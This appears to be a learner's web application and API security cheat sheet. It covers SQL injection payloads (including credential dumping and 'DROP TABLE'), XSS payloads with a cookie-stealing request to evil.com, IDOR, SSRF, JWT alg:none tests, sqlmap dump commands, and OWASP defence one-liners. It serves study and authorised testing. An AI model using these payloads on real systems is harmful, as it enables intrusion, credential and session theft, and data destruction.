# Month 8 — Web App & API Security Cheat Sheet

## SQL Injection Payloads

| Type | Payload | Notes |
|---|---|---|
| Authentication bypass | `' OR '1'='1` | Classic login bypass |
| Comment out rest | `admin'--` | Terminate query after username |
| UNION (2 cols) | `' UNION SELECT null,null--` | Find column count first |
| Data exfil | `' UNION SELECT username,password FROM users--` | Dump credentials |
| Boolean blind | `' AND 1=1--` / `' AND 1=2--` | True/false condition |
| Time blind (MySQL) | `' AND SLEEP(5)--` | Infer data via delay |
| Time blind (MSSQL) | `'; WAITFOR DELAY '0:0:5'--` | Same concept |
| Stacked queries | `'; DROP TABLE users--` | Dangerous — only if allowed |

## XSS Payload Reference

| Context | Payload |
|---|---|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `" onmouseover="alert(1)` |
| href attribute | `javascript:alert(1)` |
| Script context | `'; alert(1);//` |
| Cookie theft | `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">` |
| Stored + redirect | `<script>window.location='https://evil.com'</script>` |

## HTTP Request Manipulation (Burp Repeater)

```http
# IDOR test — change user ID
GET /api/account/1001 HTTP/1.1
Host: target.com
Authorization: Bearer <your_token>

# Mass assignment test — add privileged fields
POST /api/users/update HTTP/1.1
Content-Type: application/json

{"name":"Alice","role":"admin","is_verified":true}

# SSRF test
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1

# JWT alg:none
Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
```

## OWASP Top 10 One-Liners

| ID | One-liner defence |
|---|---|
| A01 Broken Access Control | Check object ownership server-side on every request |
| A02 Crypto Failures | bcrypt for passwords; TLS 1.2+ everywhere; no MD5/SHA1 |
| A03 Injection | Parameterised queries; `shlex.quote()` for shell; validate + reject |
| A04 Insecure Design | Threat model early; fail securely; principle of least privilege |
| A05 Misconfiguration | Remove defaults; disable debug mode; restrict HTTP methods |
| A06 Vulnerable Components | Pin versions; automate CVE scanning; review transitive deps |
| A07 Auth Failures | MFA; lockout; short-lived JWTs; rotate secrets |
| A08 Software Integrity | Verify package hashes; use lock files; audit CI pipeline |
| A09 Logging Failures | Log auth events; centralise; alert on anomalies; retain 90 days |
| A10 SSRF | Allowlist outbound; block 169.254.x.x/10.x.x.x/192.168.x.x |

## Burp Suite Keyboard Shortcuts

| Action | Shortcut |
|---|---|
| Send to Repeater | Ctrl+R |
| Send to Intruder | Ctrl+I |
| Forward request | F8 |
| Drop request | F12 |
| New Repeater tab | Ctrl+T |
| Search in request | Ctrl+F |

## API Security Test Checklist

```
[ ] Test every endpoint with another user's token (BOLA)
[ ] Try removing Authorization header entirely
[ ] Add/modify fields in POST body (mass assignment)
[ ] Test rate limiting: 100+ requests in 10 seconds
[ ] Check response for excess data (filter client-side?)
[ ] Enumerate IDs sequentially (1, 2, 3...)
[ ] Decode JWT and check claims + algorithm
[ ] Test HTTP methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
[ ] Check for GraphQL introspection enabled in production
[ ] Test API versioning: /v1/ vs /v2/ vs /v3/ — older versions removed?
```

## Common HTTP Status Codes (Security Relevance)

| Code | Meaning | Security Note |
|---|---|---|
| 200 | OK | Response returned — check if IDOR succeeded |
| 401 | Unauthorised | Missing/invalid auth token |
| 403 | Forbidden | Auth OK but access denied — compare with 200 |
| 404 | Not Found | Resource missing (or hidden) |
| 429 | Too Many Requests | Rate limiting active |
| 500 | Server Error | May reveal stack traces or tech info |
| 302 | Redirect | Open redirect potential? |

## SQLMap Quick Reference

```bash
# Basic test
sqlmap -u "http://target.com/page?id=1" --dbs

# With Burp-captured request
sqlmap -r request.txt --dbs

# Dump specific table
sqlmap -u "http://target.com/?id=1" -D users_db -T users --dump

# Cookie-based injection
sqlmap -u "http://target.com/" --cookie="session=abc123" --dbs

# POST parameter
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" -p user
```
